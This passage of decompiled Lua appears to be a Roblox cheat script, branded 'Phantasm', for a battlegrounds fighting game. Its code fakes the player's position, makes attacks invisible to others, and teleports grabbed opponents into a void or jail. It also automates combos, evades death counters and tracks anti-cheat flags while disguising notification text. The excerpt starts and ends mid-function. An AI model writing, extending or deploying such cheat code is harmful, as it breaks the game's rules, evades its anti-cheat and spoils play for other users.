                        if RunAnim and tostring(RunAnim.Animation.AnimationId):match("%d+") ~= up888 then
                            RunAnim:Destroy()
                            RunAnim = loadAnim(myHumanoid, up888)
                        end
                        if RunAnim then
                            if not table.find({
                                "17860467628"
                            }, up888) then
                                RunAnim:AdjustSpeed(Options.RunAnimationSpeed.Value)
                            end
                            if not RunAnim.IsPlaying then
                                task.spawn(function()
                                    if not myChar:FindFirstChild("Freeze") then
                                        RunAnim:Play(Options.RunAnimationStartFadeTime.Value)
                                        if up888 == "17860467628" then
                                            RunAnim:AdjustSpeed(0)
                                            RunAnim.TimePosition = 1.25
                                            local tmp889 = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, - 1, true, 0)
                                            TweenService:Create(RunAnim, tmp889, {
                                                TimePosition = 1.5
                                            }):Play()
                                        end
                                    end
                                end)
                            end
                        end
                        task.wait()
                        if myHumanoid.MoveDirection == Vector3.new() or Options.RunAnimation.Value ~= tmp887 then
                        else
                        end
                        if RunAnim then
                            RunAnim:Stop(Options.RunAnimationEndFadeTime.Value)
                        end
                        local idleTrack = nil
                        local prevIdleName = ""
                        local tmp892 = nil
                        if Idle ~= "Normal" and (not idleTrack or idleTrack and not idleTrack.IsPlaying) or prevIdleName ~= Options.IdleAnimation.Value then
                            local tmp893 = Options.IdleAnimation.Value
                            prevIdleName = Options.IdleAnimation.Value
                            if idleTrack then
                                idleTrack:Stop()
                            end
                            if tmp892 then
                                tmp892:Stop()
                            end
                            if tmp893 == "Watch" then
                                idleTrack = loadAnim(myHumanoid, "18897733312")
                                idleTrack.Priority = Enum.AnimationPriority.Idle
                                idleTrack:Play()
                            elseif tmp893 == "Casual" then
                                idleTrack = loadAnim(myHumanoid, "13736115009")
                                idleTrack.Priority = Enum.AnimationPriority.Idle
                                idleTrack:Play(0.2)
                                tmp892 = loadAnim(myHumanoid, "18253570434")
                                tmp892.Priority = Enum.AnimationPriority.Idle
                                tmp892:Play()
                                tmp892:AdjustSpeed(0)
                                tmp892.TimePosition = 0.3
                            elseif tmp893 == "Confident" then
                                idleTrack = loadAnim(myHumanoid, "18450406917")
                                idleTrack.Priority = Enum.AnimationPriority.Idle
                                idleTrack:Play(0.2)
                                idleTrack:AdjustSpeed(0)
                                TweenService:Create(idleTrack, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, - 1, true, 0), {
                                    TimePosition = 0.1
                                }):Play()
                            elseif tmp893 == "Fent Master" then
                                idleTrack = loadAnim(myHumanoid, "17086333563")
                                idleTrack.Priority = Enum.AnimationPriority.Idle
                                idleTrack:Play(0.2)
                                idleTrack:AdjustSpeed(0)
                                idleTrack.TimePosition = 1.5
                                TweenService:Create(idleTrack, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, - 1, true, 0), {
                                    TimePosition = 2
                                }):Play()
                            elseif tmp893 == "Fly Idle" then
                                idleTrack = loadAnim(myHumanoid, "17124061663")
                                idleTrack.Priority = Enum.AnimationPriority.Idle
                                idleTrack:Play()
                            end
                        end
                        RenderStepped:Wait()
                        if myHumanoid.MoveDirection == Vector3.new() then
                        end
                        if idleTrack then
                            idleTrack:Stop(Options.IdleAnimationEndFadeTime.Value)
                        end
                        if tmp892 then
                            tmp892:Stop()
                        end
                    end)
                    charConnections[# charConnections + 1] = myHumanoid.HealthChanged:Connect(function(arg894)
                        if arg894 <= 0 and myRoot.CFrame.Y <= 0 then
                            myHumanoid.Health = up876
                        end
                    end)
                    charConnections[# charConnections + 1] = myChar.AttributeChanged:Connect(function(arg895)
                        if arg895 == "Combo" and (myChar:GetAttribute("Combo") == 5 and myRoot) then
                            if Toggles.WallComboAnywhere.Value then
                                if Options.AutoWallCombo.Value == "Auto Wall Combo + Bring" then
                                    if Options.AutoWallCombo.Value == "Auto Wall Combo + Bring" then
                                        FeatureFlags["Doing Wall Combo Anywhere"] = true
                                        local tmp896 = tick()
                                        repeat
                                            getgenv().flingDesync = {
                                                CFrame = myRoot.CFrame * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0)
                                            }
                                            task.wait()
                                        until tick() >= tmp896 + 0.225
                                        local tmp897 = myRoot.CFrame
                                        getgenv().flingDesync = {
                                            CFrame = CameraLocations[Options.AutoWallComboArea.Value]
                                        }
                                        task.wait(0.2)
                                        communicate({
                                            Goal = "Wall Combo"
                                        })
                                        getgenv().flingDesync = nil
                                        FeatureFlags["Doing Wall Combo Anywhere"] = false
                                        task.wait(0.5)
                                        if myChar:FindFirstChild("ForceField") and Toggles.AutoWallComboTPBack.Value then
                                            stopAllAnims(myHumanoid)
                                            heartbeatTp(tmp897)
                                        end
                                    end
                                else
                                    local up898
                                    if FeatureFlags.Invisibility or Toggles.FuckedUpCharacter.Value then
                                        up898 = nil
                                    else
                                        local up899 = loadAnim(myHumanoid, "181525546", "Server")
                                        up899.Priority = Enum.AnimationPriority.Action3
                                        task.delay(0.1, function()
                                            up899:Play()
                                            up899.TimePosition = 1
                                            up899:AdjustWeight(999999)
                                            up899:AdjustSpeed(0)
                                        end)
                                        up898 = up899
                                    end
                                    FeatureFlags["Doing Wall Combo Anywhere"] = true
                                    local tmp900 = tick()
                                    repeat
                                        getgenv().flingDesync = {
                                            CFrame = myRoot.CFrame * CFrame.new(0, - 0.5, 0) * CFrame.Angles(math.rad(- 90), 0, 0)
                                        }
                                        task.wait()
                                    until tick() >= tmp900 + 0.6
                                    getgenv().flingDesync = nil
                                    FeatureFlags["Doing Wall Combo Anywhere"] = false
                                    task.delay(0.1, function()
                                        if up898 then
                                            up898:Stop()
                                        end
                                    end)
                                end
                            end
                        elseif arg895 == "Blocking" and (myChar:GetAttribute("Blocking") and Toggles.InvisibleMoves_Block.Value) then
                            myChar:SetAttribute("Blocking", false)
                        elseif arg895 == "TotalKillsFrb" and Toggles.AutoEmoteSpin.Value then
                            communicate({
                                Goal = "Emote Spin"
                            })
                        end
                    end)
                    task.spawn(function()
                        while task.wait() and (not getChar(LocalPlayer) or getChar(LocalPlayer) == myChar) do
                            if getgenv().desync and not myChar:FindFirstChild("AbsoluteImmortal") then
                                local tmp901 = {
                                    ReplicatedStorage.Resources.NinjaUlt.Afterimage_Despawn:Clone()
                                }
                                tmp901[1].Parent = myRoot
                                tmp901[2] = ReplicatedStorage.Resources.VanishingKick.tpthing:Clone()
                                tmp901[2].Parent = myRoot
                                local tmp902, tmp903, tmp904 = pairs(tmp901[1]:GetChildren())
                                while true do
                                    local tmp905
                                    tmp904, tmp905 = tmp902(tmp903, tmp904)
                                    if tmp904 == nil then
                                        break
                                    end
                                    if tmp905:IsA("ParticleEmitter") then
                                        tmp905.Enabled = true
                                        tmp905.Rate = 100
                                    end
                                end
                                tmp901[2].Enabled = true
                                tmp901[2].Rate = 100
                                repeat
                                    tmp901[1].CFrame = myRoot.CFrame
                                    RenderStepped:Wait()
                                until not getgenv().desync or myChar:FindFirstChild("AbsoluteImmortal")
                                local tmp906, tmp907, tmp908 = pairs(tmp901)
                                while true do
                                    local tmp909
                                    tmp908, tmp909 = tmp906(tmp907, tmp908)
                                    if tmp908 == nil then
                                        break
                                    end
                                    tmp909:Destroy()
                                end
                            end
                        end
                    end)
                    task.spawn(function()
                        local tmp910 = myChar
                        local tmp911, tmp912, tmp913 = pairs(tmp910:GetDescendants())
                        while true do
                            local up914
                            tmp913, up914 = tmp911(tmp912, tmp913)
                            if tmp913 == nil then
                                break
                            end
                            if up914:IsA("BasePart") and (up914 ~= myRoot and up914.Transparency ~= 1) and not up914.Name:lower():find("hitbox") then
                                task.spawn(function()
                                    while task.wait() and (not getChar(LocalPlayer) or getChar(LocalPlayer) == myChar) do
                                        if up914 and (FeatureFlags.Invisibility or getgenv().desync and not myChar:FindFirstChild("AbsoluteImmortal")) then
                                            up914.Transparency = 0.5
                                            repeat
                                                RenderStepped:Wait()
                                            until not FeatureFlags.Invisibility and (not getgenv().desync or myChar:FindFirstChild("AbsoluteImmortal")) or getChar(LocalPlayer) and getChar(LocalPlayer) ~= myChar
                                            up914.Transparency = 0
                                        end
                                    end
                                end)
                            end
                        end
                    end)
                    charConnections[# charConnections + 1] = myHumanoid.AnimationPlayed:Connect(function(animTrack)
                        local animId = animTrack.Animation.AnimationId
                        if animTrack.Priority == Enum.AnimationPriority.Action4 and (animTrack.Animation.AnimationId ~= SpecialSound.ID and (FeatureFlags.Invisibility and not (getgenv().flingDesync and getgenv().flingDesync.Velocity))) then
                            animTrack:AdjustWeight(- 999999)
                        end
                        if animId:match("95000469063288") and (Toggles.TrashcanLaunchh and Toggles.TrashcanLaunchh.Value) then
                            local tmp917 = os.clock()
                            repeat
                                RenderStepped:Wait()
                            until os.clock() >= tmp917 + 3
                            myHumanoid.Health = 0
                        end
                        if idMatch(animId, {
                            "18748398210"
                        }) then
                            up645 = up645 + 1
                            UILib:Notify({
                                Title = bypassText("Anticheat Flagged"),
                                Description = bypassText("A2 (Animation)"),
                                Time = 10,
                                SoundId = SoundIds.Notification
                            })
                        end
                        if idMatch(animId, {
                            "13814919604",
                            "13813450889",
                            "13813448561",
                            "13813955149"
                        }) and Toggles.NoTrashcanHold.Value then
                            animTrack:Stop()
                        elseif idMatch(animId, {
                            "7815618175"
                        }) and Options.RunAnimation.Value ~= "Normal" then
                            animTrack:Stop()
                        elseif idMatch(animId, {
                            "10470389827"
                        }) and Options.BlockAnimation.Value ~= "Normal" then
                            animTrack:Stop()
                        elseif idMatch(animId, OtherSounds) then
                            if Toggles.CustomSideDash.Value then
                                animTrack:AdjustSpeed(Options.SDSpeed.Value)
                            end
                            if Toggles.M1Reset.Value then
                                local up923 = UserInputService.InputBegan:Once(function()
                                    while true do
                                        if UserInputService:IsKeyDown(Enum.KeyCode.Q) and not myChar:FindFirstChild("RagdollCancel") then
                                            if UserInputService:IsKeyDown(Enum.KeyCode.A) or (UserInputService:IsKeyDown(Enum.KeyCode.D) or UserInputService:IsKeyDown(Enum.KeyCode.S)) then
                                                if workspace:GetAttribute("NoDashCooldown") then
                                                    animTrack:Stop()
                                                    local tmp918 = myChar
                                                    local tmp919, tmp920, tmp921 = pairs(tmp918:GetChildren())
                                                    while true do
                                                        local tmp922
                                                        tmp921, tmp922 = tmp919(tmp920, tmp921)
                                                        if tmp921 == nil then
                                                            break
                                                        end
                                                        if tmp922.Name == "UsedDash" or tmp922.Name == "Freeze" then
                                                            tmp922:Destroy()
                                                        end
                                                    end
                                                end
                                            else
                                                communicate({
                                                    Dash = Enum.KeyCode.W,
                                                    Key = Enum.KeyCode.Q,
                                                    Goal = "KeyPress"
                                                })
                                            end
                                            break
                                        end
                                        RenderStepped:Wait()
                                        if not animTrack.IsPlaying then
                                            break
                                        end
                                    end
                                end)
                                task.delay(1, function()
                                    up923:Disconnect()
                                end)
                            end
                        elseif animId:match("11343250001") and rawget(Options.AntiMoves_Saitama.Value, "Anti Death Counter") then
                            animTrack:Stop()
                            task.spawn(fixCam)
                            myChar:WaitForChild("AbsoluteImmortal", 1)
                            if not myChar:FindFirstChild("AbsoluteImmortal") then
                                return
                            end
                            local tmp924 = myRoot.CFrame
                            local tmp925 = Players
                            local tmp926, tmp927, tmp928 = pairs(tmp925:GetPlayers())
                            local tmp929 = nil
                            while true do
                                local tmp930, tmp931 = tmp926(tmp927, tmp928)
                                if tmp930 == nil then
                                    break
                                end
                                tmp928 = tmp930
                                if tmp931 ~= LocalPlayer then
                                    local tmp932 = getChar(tmp931)
                                    local tmp933
                                    if tmp932 then
                                        tmp933 = getRoot(tmp932)
                                    else
                                        tmp933 = tmp932
                                    end
                                    local tmp934
                                    if tmp932 then
                                        tmp934 = getHumanoid(tmp932)
                                    else
                                        tmp934 = tmp932
                                    end
                                    if tmp932 and (tmp933 and tmp934) then
                                        local tmp935, tmp936, tmp937 = pairs(tmp934:GetPlayingAnimationTracks())
                                        while true do
                                            local tmp938
                                            tmp937, tmp938 = tmp935(tmp936, tmp937)
                                            if tmp937 == nil then
                                                break
                                            end
                                            if tmp938.Animation.AnimationId:match("11343318134") and (myRoot.Position - tmp933.Position).Magnitude <= 15 then
                                                tmp929 = tmp931
                                            end
                                        end
                                    end
                                end
                            end
                            local up939
                            if tmp929 then
                                up939 = getChar(tmp929)
                                if up939 then
                                    up939 = getHumanoid(up939)
                                end
                                UILib:Notify({
                                    Title = bypassText("Phantasm"),
                                    Description = bypassText(tmp929.DisplayName .. " death countered you!"),
                                    Time = 5,
                                    SoundId = SoundIds.Notification
                                })
                            else
                                up939 = ({
                                    Character = {
                                        Humanoid = {
                                            Health = 100
                                        }
                                    },
                                    DisplayName = "{Failed to get username}"
                                }).Character.Humanoid
                                task.delay(2, function()
                                    up939.Health = 0
                                end)
                                UILib:Notify({
                                    Title = bypassText("Phantasm"),
                                    Description = bypassText("Unable to find who death countered you."),
                                    Time = 5,
                                    SoundId = SoundIds.Notification
                                })
                            end
                            local tmp940 = workspace.CurrentCamera
                            local tmp941
                            if tmp940 then
                                tmp941 = tmp940.CameraSubject
                                tmp940.CameraSubject = nil
                            else
                                tmp941 = nil
                            end
                            local tmp942 = tick()
                            repeat
                                heartbeatTp(TeleportLocations.Void * CFrame.Angles(math.rad(90), 0, 0))
                                RenderStepped:Wait()
                            until up939 and up939.Health <= 0 or (myHumanoid.Health <= 0 or tick() >= tmp942 + 10)
                            if tmp940 then
                                tmp940.CameraSubject = tmp941
                            end
                            heartbeatTp(tmp924)
                            task.wait(1)
                            if myChar:FindFirstChild("Freeze") then
                                myChar.Freeze:Destroy()
                            end
                            if myChar:FindFirstChild("NoRotate") then
                                myChar.NoRotate:Destroy()
                            end
                            task.spawn(fixCam)
                        elseif animId:match("11365563255") and rawget(Options.InvisibleMoves_Saitama.Value, "Invisible Table Flip") then
                            animTrack:Stop()
                            task.delay(3, function()
                                myHumanoid.HipHeight = 10
                                task.wait(0.75)
                                myHumanoid.HipHeight = 0
                            end)
                        elseif animId:match("12983333733") then
                            if rawget(Options.InvisibleMoves_Saitama.Value, "Invisible Serious Punch") then
                                animTrack:Stop()
                            end
                        elseif animId:match("13927612951") and rawget(Options.InvisibleMoves_Saitama.Value, "Invisible Omni-Directional Punch") then
                            animTrack:Stop()
                        elseif animId:match("12447707844") and rawget(Options.InvisibleMoves_Saitama.Value, "Invisible Ult") then
                            animTrack:Stop()
                            local tmp943 = tick()
                            repeat
                                getgenv().desync = {
                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                }
                                task.wait()
                            until tick() >= tmp943 + 1
                            getgenv().desync = nil
                        elseif animId:match("12342141464") and rawget(Options.InvisibleMoves_Garou.Value, "Invisible Ult") then
                            animTrack:Stop()
                        elseif table.find({
                            "rbxassetid://13499771836",
                            "rbxassetid://13497875049"
                        }, animId) and rawget(Options.InvisibleMoves_Sonic.Value, "Invisible Ult") then
                            animTrack:Stop()
                        elseif animId:match("12772543293") and rawget(Options.InvisibleMoves_Genos.Value, "Invisible Ult") then
                            animTrack:Stop()
                        elseif animId:match("13146710762") and rawget(Options.InvisibleMoves_Genos.Value, "Invisible Incinerate") then
                            animTrack:Stop()
                        elseif animId:match("15145462680") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Atmos Cleave") then
                            animTrack:Stop()
                        elseif animId:match("15391323441") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Ult") then
                            animTrack:Stop()
                        elseif idMatch(animId, {
                            "16139108718",
                            "16139708727",
                            "16139402582"
                        }) and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Crushing Pull") then
                            animTrack:Stop()
                        elseif animId:match("16515850153") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Windstorm Fury") then
                            animTrack:Stop()
                        elseif animId:match("16431491215") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Stone Grave") then
                            animTrack:Stop()
                        elseif idMatch(animId, {
                            "16597322398",
                            "16597912086"
                        }) and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Expulsive Push") then
                            animTrack:Stop()
                        elseif animId:match("16734584478") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Ult") then
                            animTrack:Stop()
                        elseif animId:match("15520132233") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Sunset") then
                            animTrack:Stop()
                        elseif animId:match("15676072469") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Solar Cleave") then
                            animTrack:Stop()
                        elseif animId:match("16062410809") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Sunrise") then
                            animTrack:Stop()
                        elseif animId:match("16062712948") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Sunrise Finisher") then
                            animTrack:Stop()
                        elseif animId:match("16082123712") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Atomic Slash") then
                            animTrack:Stop()
                        elseif animId:match("16057411888") and rawget(Options.InvisibleMoves_AtomicSamurai.Value, "Invisible Atomic Slash Finisher") then
                            animTrack:Stop()
                        elseif animId:match("17799224866") and rawget(Options.InvisibleMoves_Suiryu.Value, "Invisible Bullet Barrage") then
                            animTrack:Stop()
                        elseif animId:match("17275150809") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Terrible Tornado") then
                            animTrack:Stop()
                        elseif animId:match("17278415853") and rawget(Options.InvisibleMoves_Tatsumaki.Value, "Invisible Terrible Tornado Finisher") then
                            animTrack:Stop()
                        elseif table.find(KillSounds, animId) and Toggles.InvisibleMoves_Counter.Value then
                            animTrack:AdjustWeight(- 999999)
                        elseif table.find(HitSounds, animId) and Toggles.InvisibleMoves_CounterHit.Value then
                            animTrack:Stop()
                        elseif table.find(AbilitySounds, animId) and Toggles.InvisibleMoves_Block.Value then
                            animTrack:AdjustWeight(- 999999)
                            local tmp944 = myRoot:FindFirstChild("EsperShield")
                            if tmp944 then
                                local tmp945, tmp946, tmp947 = pairs(tmp944:GetChildren())
                                while true do
                                    local tmp948, up949 = tmp945(tmp946, tmp947)
                                    if tmp948 == nil then
                                        break
                                    end
                                    tmp947 = tmp948
                                    if up949:IsA("ParticleEmitter") and not up949.Name:find("Impact") then
                                        task.spawn(function()
                                            local tmp950 = up949.Rate
                                            local tmp951 = up949.Color
                                            up949.Rate = 45
                                            if Toggles.InvisibleMoves_BlockColor.Value then
                                                up949.Color = ColorSequence.new({
                                                    ColorSequenceKeypoint.new(0, Options.InvisibleMoves_BlockColor1.Value),
                                                    ColorSequenceKeypoint.new(0.5, Options.InvisibleMoves_BlockColor2.Value),
                                                    ColorSequenceKeypoint.new(1, Options.InvisibleMoves_BlockColor3.Value)
                                                })
                                            end
                                            up949.Enabled = true
                                            repeat
                                                RenderStepped:Wait()
                                            until not animTrack.IsPlaying
                                            up949.Enabled = false
                                            up949.Rate = tmp950
                                            if Toggles.InvisibleMoves_BlockColor.Value then
                                                up949.Color = tmp951
                                            end
                                        end)
                                    end
                                end
                            end
                        end
                        if Toggles.SkillBring.Value then
                            local up952 = TeleportLocations[Options.SkillBringArea.Value]
                            local up953 = Toggles.SkillBringTPBack.Value
                            if animId:match("12273188754") then
                                task.wait(0.25)
                                FeatureFlags["Pause Orbit"] = true
                                local tmp954 = myRoot.CFrame
                                tick()
                                TweenService:Create(myRoot, TweenInfo.new(0.75, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                    CFrame = up952
                                }):Play()
                                task.wait(0.75)
                                FeatureFlags["Pause Orbit"] = false
                                if up953 then
                                    heartbeatTp(tmp954)
                                end
                            elseif animId:match("12296113986") then
                                FeatureFlags["Pause Orbit"] = true
                                local tmp955 = myRoot.CFrame
                                TweenService:Create(myRoot, TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                    CFrame = up952
                                }):Play()
                                task.wait(1.5)
                                FeatureFlags["Pause Orbit"] = false
                                if up953 then
                                    heartbeatTp(tmp955)
                                end
                            elseif animId:match("14048285180") or animId:match("14046756619") then
                                task.wait(0.35)
                                FeatureFlags["Pause Orbit"] = true
                                local tmp956 = myRoot.CFrame
                                TweenService:Create(myRoot, TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                    CFrame = CFrame.new(- 66, 29, 20383)
                                }):Play()
                                task.wait(2.25)
                                FeatureFlags["Pause Orbit"] = false
                                if up953 then
                                    heartbeatTp(tmp956)
                                end
                            elseif animId:match("14705929107") then
                                task.wait(1.75)
                                FeatureFlags["Pause Orbit"] = true
                                local tmp957 = myRoot.CFrame
                                local tmp958 = tick()
                                repeat
                                    heartbeatTp(up952)
                                    task.wait()
                                until tick() >= tmp958 + 0.5
                                FeatureFlags["Pause Orbit"] = false
                                if up953 then
                                    heartbeatTp(tmp957)
                                end
                            elseif animId:match("13376962659") then
                                task.wait(1.5)
                                FeatureFlags["Pause Orbit"] = true
                                local tmp959 = myRoot.CFrame
                                local tmp960 = tick()
                                repeat
                                    heartbeatTp(up952)
                                    task.wait()
                                until tick() >= tmp960 + 0.5
                                FeatureFlags["Pause Orbit"] = false
                                if up953 then
                                    heartbeatTp(tmp959)
                                end
                            elseif animId:match("15145462680") then
                                task.spawn(function()
                                    task.wait(1.8)
                                    local tmp961 = Players
                                    local tmp962, tmp963, tmp964 = pairs(tmp961:GetPlayers())
                                    while true do
                                        local tmp965
                                        tmp964, tmp965 = tmp962(tmp963, tmp964)
                                        if tmp964 == nil then
                                            break
                                        end
                                        if tmp965 ~= LocalPlayer then
                                            local tmp966 = getChar(tmp965)
                                            local tmp967
                                            if tmp966 then
                                                tmp967 = getRoot(tmp966)
                                            else
                                                tmp967 = tmp966
                                            end
                                            local tmp968
                                            if tmp966 then
                                                tmp968 = getHumanoid(tmp966)
                                            else
                                                tmp968 = tmp966
                                            end
                                            if tmp966 and (tmp967 and (tmp968 and ((tmp967.Position - myRoot.Position).Magnitude <= 15 and tmp968.Health <= 20))) then
                                                return
                                            end
                                        end
                                    end
                                    FeatureFlags["Pause Orbit"] = true
                                    local tmp969 = myRoot.CFrame
                                    local tmp970 = tick()
                                    repeat
                                        heartbeatTp(up952)
                                        task.wait()
                                    until tick() >= tmp970 + 0.5
                                    FeatureFlags["Pause Orbit"] = false
                                    if up953 then
                                        heartbeatTp(tmp969)
                                    end
                                end)
                            elseif animId:match("15295895753") then
                                task.wait(0.4)
                                if animTrack.IsPlaying then
                                    FeatureFlags["Pause Orbit"] = true
                                    local tmp971 = myRoot.CFrame
                                    local tmp972 = tick()
                                    repeat
                                        heartbeatTp(up952)
                                        task.wait()
                                    until tick() >= tmp972 + 0.8
                                    FeatureFlags["Pause Orbit"] = false
                                    if up953 then
                                        heartbeatTp(tmp971)
                                    end
                                end
                            elseif animId:match("16139108718") then
                                local tmp973 = myRoot.CFrame
                                FeatureFlags["Pause Orbit"] = true
                                local tmp974 = tick()
                                repeat
                                    heartbeatTp(up952)
                                    task.wait()
                                until tick() >= tmp974 + 1
                                FeatureFlags["Pause Orbit"] = false
                                if up953 then
                                    heartbeatTp(tmp973)
                                end
                            end
                        end
                        if animId:match("135104210400610") then
                            repeat
                                task.wait()
                            until not animTrack.IsPlaying
                            if animTrack.TimePosition >= 0.75 then
                                local tmp975 = Players
                                local tmp976, tmp977, tmp978 = pairs(tmp975:GetPlayers())
                                while true do
                                    local tmp979, tmp980 = tmp976(tmp977, tmp978)
                                    if tmp979 == nil then
                                        break
                                    end
                                    tmp978 = tmp979
                                    if tmp980 ~= LocalPlayer then
                                        local tmp981 = getChar(tmp980)
                                        if tmp981 then
                                            tmp981:SetAttribute("CrushedRockVariant", nil)
                                        end
                                    end
                                end
                            end
                        end
                        if Toggles.AttackAll.Value then
                            if animId:match("14719290328") and rawget(Options.AttackAllMoves.Value, "Savage Tornado") then
                                local tmp982 = myRoot.CFrame
                                heartbeatTp(TeleportLocations.Void)
                                task.wait(0.9)
                                local tmp983 = tick()
                                repeat
                                    grabRandom(true)
                                    task.wait(0.03)
                                until tick() >= tmp983 + 1.75
                                TweenService:Create(myRoot, TweenInfo.new(0.35, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                    CFrame = TeleportLocations["Even Bigger Jail"]
                                }):Play()
                                task.wait(1.5)
                                heartbeatTp(tmp982)
                            end
                            if animId:match("14701242661") and rawget(Options.AttackAllMoves.Value, "Brutal Beatdown") then
                                heartbeatTp(TeleportLocations.Void)
                                task.wait(2)
                                local tmp984 = tick()
                                repeat
                                    grabRandom(true)
                                    task.wait(0.05)
                                until tick() >= tmp984 + 4.5
                                local tmp985 = tick()
                                grabRandom(true)
                                task.wait(0.03)
                                if tick() >= tmp985 + 1.3 then
                                end
                            end
                            if animId:match("135104210400610") and rawget(Options.AttackAllMoves.Value, "Crushed Rock Variant") then
                                local tmp986 = getAllPlayers()
                                local tmp987, tmp988, tmp989 = pairs(tmp986)
                                local tmp990 = nil
                                while true do
                                    local tmp991, tmp992 = tmp987(tmp988, tmp989)
                                    if tmp991 == nil then
                                        break
                                    end
                                    tmp989 = tmp991
                                    local tmp993 = getChar(tmp992)
                                    local tmp994
                                    if tmp993 then
                                        tmp994 = tmp993:FindFirstChildWhichIsA("ForceField")
                                    else
                                        tmp994 = tmp993
                                    end
                                    if tmp993 and not (tmp994 or tmp993:GetAttribute("CrushedRockVariant")) then
                                        tmp990 = tmp992
                                    end
                                end
                                local tmp995
                                if tmp990 then
                                    tmp995 = getChar(tmp990)
                                else
                                    tmp995 = tmp990
                                end
                                local tmp996
                                if tmp995 then
                                    tmp996 = getRoot(tmp995)
                                else
                                    tmp996 = tmp995
                                end
                                if tmp990 and (tmp995 and tmp996) then
                                    repeat
                                        heartbeatTp(tmp996.CFrame)
                                        task.wait()
                                    until not animTrack.IsPlaying
                                end
                            end
                        else
                            if Toggles.SkillThrow.Value then
                                local tmp997 = Options.SkillThrowMoves.Value
                                if animId:match("12309835105") and rawget(tmp997, "Hunters Grasp") then
                                    task.wait(0.3)
                                    local tmp998 = myRoot.CFrame
                                    TweenService:Create(myRoot, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                        CFrame = myRoot.CFrame * CFrame.new(0, 2500, 0)
                                    }):Play()
                                    task.wait(0.8)
                                    heartbeatTp(tmp998)
                                elseif animId:match("14004235777") and rawget(tmp997, "Homerun") then
                                    task.wait(0.4)
                                    local tmp999 = myRoot.CFrame
                                    TweenService:Create(myRoot, TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
                                        CFrame = myRoot.CFrame * CFrame.new(0, 10000, 0)
                                    }):Play()
                                    task.wait(1)
                                    heartbeatTp(tmp999)
                                end
                            end
                            return
                        end
                    end)
                    local up1000 = {}
                    charConnections[# charConnections + 1] = myChar.DescendantAdded:Connect(function(addedDesc)
                        if table.find({
                            "BODYGYRO",
                            "BodyGyroBind"
                        }, addedDesc.Name) and Options.RunAnimation.Value == "Sonic EXE" then
                            deleteNew(addedDesc, false)
                        end
                        if addedDesc:IsA("Sound") and (addedDesc.SoundId:match("16139753098") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Crushing Pull")) then
                            local tmp1002 = tick()
                            repeat
                                communicate({
                                    Goal = "KeyPress",
                                    Key = Enum.KeyCode.F
                                })
                                RenderStepped:Wait()
                            until tick() >= tmp1002 + 0.5
                            communicate({
                                Goal = "KeyRelease",
                                Key = Enum.KeyCode.F
                            })
                        end
                        if addedDesc:IsA("ObjectValue") and addedDesc.Name:lower() == "wallcombo" then
                            local tmp1003 = tick()
                            while true do
                                if Options.AutoWallCombo.Value == "Auto Wall Combo" then
                                    communicate({
                                        Goal = "Wall Combo"
                                    })
                                end
                                task.wait()
                                if addedDesc.Parent ~= myChar or tick() >= tmp1003 + (addedDesc:GetAttribute("DeleteMe") or 0.6) then
                                end
                            end
                        else
                            if addedDesc:IsA("BodyPosition") then
                                if addedDesc.Name ~= "AIRBP" or (addedDesc.D ~= 800 or (addedDesc.P ~= 10000 or (addedDesc.MaxForce ~= Vector3.new(1, 1, 1) * 40000 or not Toggles.NoBP_WindstormFury.Value))) then
                                    if addedDesc.Name ~= "AIRBP" or (addedDesc.D ~= 800 or (addedDesc.P ~= 10000 or (addedDesc.MaxForce ~= Vector3.new(1, 1, 1) * 40000 or (addedDesc:GetAttribute("SpinCenter") == nil or not Toggles.NoBP_TatsumakiUlt.Value)))) then
                                        if addedDesc.Name == "AIRBP" and (addedDesc.D == 850 and (addedDesc.P == 10000 and (addedDesc.MaxForce == Vector3.new(1, 1, 1) * 40000 and Toggles.NoBP_PreysPeril.Value))) then
                                            task.spawn(pcall, deleteNew, addedDesc, false)
                                        end
                                    else
                                        task.spawn(pcall, deleteNew, addedDesc, false)
                                    end
                                else
                                    task.spawn(pcall, deleteNew, addedDesc, false)
                                end
                            end
                            if addedDesc:IsA("BodyVelocity") then
                                if addedDesc.Name ~= "moveme" or (addedDesc:GetAttribute("Speed") or 0) ~= 165 then
                                    if addedDesc.Name == "dodgevelocity" and not addedDesc:GetAttribute("Clone") then
                                        Stepped:Wait()
                                        local tmp1004 = myHumanoid
                                        local tmp1005, tmp1006, tmp1007 = pairs(tmp1004:GetPlayingAnimationTracks())
                                        while true do
                                            local tmp1008
                                            tmp1007, tmp1008 = tmp1005(tmp1006, tmp1007)
                                            if tmp1007 == nil then
                                                break
                                            end
                                            if tmp1008.Animation.AnimationId:match("10491993682") and tmp1008.TimePosition <= 0.1 then
                                                if Toggles.CustomBackDash.Value then
                                                    local tmp1009 = addedDesc:Clone()
                                                    tmp1009:SetAttribute("Clone", true)
                                                    table.insert(up1000, tmp1009)
                                                    addedDesc.Parent = workspace
                                                    while addedDesc and addedDesc.Parent do
                                                        tmp1009.Parent = myRoot
